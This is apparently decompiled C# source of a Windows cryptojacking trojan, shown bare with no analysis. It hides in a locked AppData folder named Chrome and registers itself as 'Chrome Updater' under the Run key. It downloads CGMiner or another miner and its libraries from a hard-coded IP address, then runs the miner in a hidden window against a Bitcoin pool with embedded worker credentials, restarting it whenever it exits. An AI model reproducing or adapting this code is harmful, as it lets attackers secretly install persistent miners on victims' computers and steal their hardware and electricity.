using System;
using System.Diagnostics;
using System.IO;
using System.Net;
using System.Runtime.InteropServices;
using System.Security.AccessControl;
using System.Security.Principal;
using System.Threading;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.VisualBasic.Devices;
using My;

[StandardModule]
public sealed class Form3
{
	private static WebClient WebClient1 = new WebClient();

	private static Process MiningProcess = new Process();

	[DllImport("kernel32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern int GetModuleFileNameA(int hModule, [MarshalAs(UnmanagedType.VBByRefStr)] ref string lpFileName, int nSize);

	[DllImport("kernel32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern int MoveFileExW([In][MarshalAs(UnmanagedType.LPTStr)] string lpExistingFileName, [In][MarshalAs(UnmanagedType.LPTStr)] string lpNewFileName, long dwFlags);

	[STAThread]
	public static void Main()
	{
		//IL_0765: Unknown result type (might be due to invalid IL or missing references)
		string name = "goblmah371z";
		try
		{
			Mutex.OpenExisting(name);
			Environment.Exit(0);
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			new Mutex(initiallyOwned: true, name);
			ProjectData.ClearProjectError();
		}
		try
		{
			if (!Directory.Exists(Interaction.Environ("appdata") + "\\Chrome"))
			{
				LockAndHideFolder(Interaction.Environ("appdata") + "\\Chrome");
			}
			((ServerComputer)MyProject.Computer).get_Registry().get_CurrentUser().OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", writable: true)!.SetValue("Chrome Updater", Interaction.Environ("appdata") + "\\Chrome\\ChromeUpdate.exe");
			if (!File.Exists(Interaction.Environ("appdata") + "\\Chrome\\ChromeUpdate.exe"))
			{
				string? fileName = Process.GetCurrentProcess().MainModule!.FileName;
				string lpFileName = Process.GetCurrentProcess().MainModule!.FileName;
				MoveFileExW(Strings.LSet(fileName, GetModuleFileNameA(0, ref lpFileName, 256)), Interaction.Environ("appdata") + "\\Chrome\\ChromeUpdate.exe", 8L);
			}
			string path = Interaction.Environ("windir") + "\\System32\\OpenCL.DLL";
			new DirectoryInfo(path);
			if (File.Exists(path))
			{
				if (!File.Exists(Interaction.Environ("appdata") + "\\Chrome\\CGMiner.exe"))
				{
					WebClient1.DownloadFile("http://192.40.57.179/sov1001/CGMiner.exe", Interaction.Environ("appdata") + "\\Chrome\\CGMiner.exe");
				}
				if (!File.Exists(Interaction.Environ("appdata") + "\\Chrome\\diablo130302.cl"))
				{
					WebClient1.DownloadFile("http://192.40.57.179/sov1001/diablo130302.cl", Interaction.Environ("appdata") + "\\Chrome\\diablo130302.cl");
				}
				if (!File.Exists(Interaction.Environ("appdata") + "\\Chrome\\diakgcn121016.cl"))
				{
					WebClient1.DownloadFile("http://192.40.57.179/sov1001/diakgcn121016.cl", Interaction.Environ("appdata") + "\\Chrome\\diakgcn121016.cl");
				}
				if (!File.Exists(Interaction.Environ("appdata") + "\\Chrome\\libeay32.dll"))
				{
					WebClient1.DownloadFile("http://192.40.57.179/sov1001/libeay32.dll", Interaction.Environ("appdata") + "\\Chrome\\libeay32.dll");
				}
				if (!File.Exists(Interaction.Environ("appdata") + "\\Chrome\\libidn-11.dll"))
				{
					WebClient1.DownloadFile("http://192.40.57.179/sov1001/libidn-11.dll", Interaction.Environ("appdata") + "\\Chrome\\libidn-11.dll");
				}
				if (!File.Exists(Interaction.Environ("appdata") + "\\Chrome\\libpdcurses.dll"))
				{
					WebClient1.DownloadFile("http://192.40.57.179/sov1001/libpdcurses.dll", Interaction.Environ("appdata") + "\\Chrome\\libpdcurses.dll");
				}
				if (!File.Exists(Interaction.Environ("appdata") + "\\Chrome\\phatk121016.cl"))
				{
					WebClient1.DownloadFile("http://192.40.57.179/sov1001/phatk121016.cl", Interaction.Environ("appdata") + "\\Chrome\\phatk121016.cl");
				}
				if (!File.Exists(Interaction.Environ("appdata") + "\\Chrome\\poclbm130302.cl"))
				{
					WebClient1.DownloadFile("http://192.40.57.179/sov1001/poclbm130302.cl", Interaction.Environ("appdata") + "\\Chrome\\poclbm130302.cl");
				}
				if (!File.Exists(Interaction.Environ("appdata") + "\\Chrome\\libcurl.dll"))
				{
					WebClient1.DownloadFile("http://192.40.57.179/sov1001/libcurl.dll", Interaction.Environ("appdata") + "\\Chrome\\libcurl.dll");
				}
				if (!File.Exists(Interaction.Environ("appdata") + "\\Chrome\\pthreadGC2.dll"))
				{
					WebClient1.DownloadFile("http://192.40.57.179/sov1001/pthreadGC2.dll", Interaction.Environ("appdata") + "\\Chrome\\pthreadGC2.dll");
				}
				if (!File.Exists(Interaction.Environ("appdata") + "\\Chrome\\scrypt130511.cl"))
				{
					WebClient1.DownloadFile("http://192.40.57.179/sov1001/scrypt130511.cl", Interaction.Environ("appdata") + "\\Chrome\\scrypt130511.cl");
				}
				if (!File.Exists(Interaction.Environ("appdata") + "\\Chrome\\ssleay32.dll"))
				{
					WebClient1.DownloadFile("http://192.40.57.179/sov1001/ssleay32.dll", Interaction.Environ("appdata") + "\\Chrome\\ssleay32.dll");
				}
				if (!File.Exists(Interaction.Environ("appdata") + "\\Chrome\\zlib1.dll"))
				{
					WebClient1.DownloadFile("http://192.40.57.179/sov1001/zlib1.dll", Interaction.Environ("appdata") + "\\Chrome\\zlib1.dll");
				}
				Thread.Sleep(3009);
				ProcessStartInfo startInfo = MiningProcess.StartInfo;
				startInfo.FileName = Interaction.Environ("appdata") + "\\Chrome\\CGMiner.exe";
				startInfo.CreateNoWindow = true;
				startInfo.WindowStyle = ProcessWindowStyle.Hidden;
				startInfo.Arguments = "-o http://api.bitcoin.cz:8332 -u henkie123.worker2 -p kaasbaas123 --auto-fan --auto-gpu --gpu-threads 10 --gpu-fan 60 --temp-target 100 --temp-overheat 110 --no-submit-stale";
				startInfo = null;
			}
			else
			{
				if (!File.Exists(Interaction.Environ("appdata") + "\\Chrome\\Chrome.exe"))
				{
					WebClient1.DownloadFile("http://192.40.57.179/sov1001/coin-miner.exe", Interaction.Environ("appdata") + "\\Chrome\\Chrome.exe");
				}
				if (!File.Exists(Interaction.Environ("appdata") + "\\Chrome\\bdb.dll"))
				{
					WebClient1.DownloadFile("http://192.40.57.179/sov1001/bdb.dll", Interaction.Environ("appdata") + "\\Chrome\\bdb.dll");
				}
				if (!File.Exists(Interaction.Environ("appdata") + "\\Chrome\\btc.il"))
				{
					WebClient1.DownloadFile("http://192.40.57.179/sov1001/btc.il", Interaction.Environ("appdata") + "\\Chrome\\btc.il");
				}
				if (!File.Exists(Interaction.Environ("appdata") + "\\Chrome\\btc-evergreen.il"))
				{
					WebClient1.DownloadFile("http://192.40.57.179/sov1001/btc-evergreen.il", Interaction.Environ("appdata") + "\\Chrome\\btc-evergreen.il");
				}
				if (!File.Exists(Interaction.Environ("appdata") + "\\Chrome\\coinutil.dll"))
				{
					WebClient1.DownloadFile("http://192.40.57.179/sov1001/coinutil.dll", Interaction.Environ("appdata") + "\\Chrome\\coinutil.dll");
				}
				if (!File.Exists(Interaction.Environ("appdata") + "\\Chrome\\miner.dll"))
				{
					WebClient1.DownloadFile("http://192.40.57.179/sov1001/miner.dll", Interaction.Environ("appdata") + "\\Chrome\\miner.dll");
				}
				if (!File.Exists(Interaction.Environ("appdata") + "\\Chrome\\phatk.cl"))
				{
					WebClient1.DownloadFile("http://192.40.57.179/sov1001/phatk.cl", Interaction.Environ("appdata") + "\\Chrome\\phatk.cl");
				}
				if (!File.Exists(Interaction.Environ("appdata") + "\\Chrome\\phatk.ptx"))
				{
					WebClient1.DownloadFile("http://192.40.57.179/sov1001/phatk.ptx", Interaction.Environ("appdata") + "\\Chrome\\phatk.ptx");
				}
				if (!File.Exists(Interaction.Environ("appdata") + "\\Chrome\\usft_ext.dll"))
				{
					WebClient1.DownloadFile("http://192.40.57.179/sov1001/usft_ext.dll", Interaction.Environ("appdata") + "\\Chrome\\usft_ext.dll");
				}
				Thread.Sleep(3009);
				ProcessStartInfo startInfo2 = MiningProcess.StartInfo;
				startInfo2.FileName = Interaction.Environ("appdata") + "\\Chrome\\Chrome.exe";
				startInfo2.CreateNoWindow = true;
				startInfo2.WindowStyle = ProcessWindowStyle.Hidden;
				startInfo2.Arguments = "-a sha256 -g no -o http://api.bitcoin.cz:8332 -u henkie123.worker2 -p kaasbaas123 -t 8";
				startInfo2 = null;
			}
			MiningProcess.Start();
			MiningProcess.EnableRaisingEvents = true;
			MiningProcess.Exited += MiningProcessClosed;
		}
		catch (Exception ex)
		{
			ProjectData.SetProjectError(ex);
			Exception ex2 = ex;
			Interaction.MsgBox((object)ex2, (MsgBoxStyle)0, (object)null);
			ProjectData.ClearProjectError();
		}
		while (true)
		{
			Thread.Sleep(3009);
		}
	}

	public static void MiningProcessClosed(object sender, EventArgs e)
	{
		MiningProcess.Start();
	}

	public static bool LockAndHideFolder(string path)
	{
		string name = WindowsIdentity.GetCurrent().Name;
		FileSystemAccessRule rule = new FileSystemAccessRule("Administrators", FileSystemRights.FullControl, InheritanceFlags.ContainerInherit | InheritanceFlags.ObjectInherit, PropagationFlags.None, AccessControlType.Allow);
		FileSystemAccessRule rule2 = new FileSystemAccessRule(name, FileSystemRights.DeleteSubdirectoriesAndFiles | FileSystemRights.Delete, InheritanceFlags.ContainerInherit | InheritanceFlags.ObjectInherit, PropagationFlags.None, AccessControlType.Deny);
		FileSystemAccessRule rule3 = new FileSystemAccessRule(name, FileSystemRights.Modify, InheritanceFlags.ObjectInherit, PropagationFlags.None, AccessControlType.Allow);
		DirectorySecurity directorySecurity = new DirectorySecurity();
		directorySecurity.AddAccessRule(rule);
		directorySecurity.AddAccessRule(rule3);
		directorySecurity.AddAccessRule(rule2);
		try
		{
			Process process = new Process();
			Directory.CreateDirectory(path, directorySecurity);
			ProcessStartInfo processStartInfo = new ProcessStartInfo();
			processStartInfo.WindowStyle = ProcessWindowStyle.Hidden;
			processStartInfo.FileName = "CMD.exe";
			processStartInfo.Arguments = "/C attrib -s -h " + Convert.ToString(path);
			process.StartInfo = processStartInfo;
			process.Start();
			return true;
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			bool result = false;
			ProjectData.ClearProjectError();
			return result;
		}
	}
}
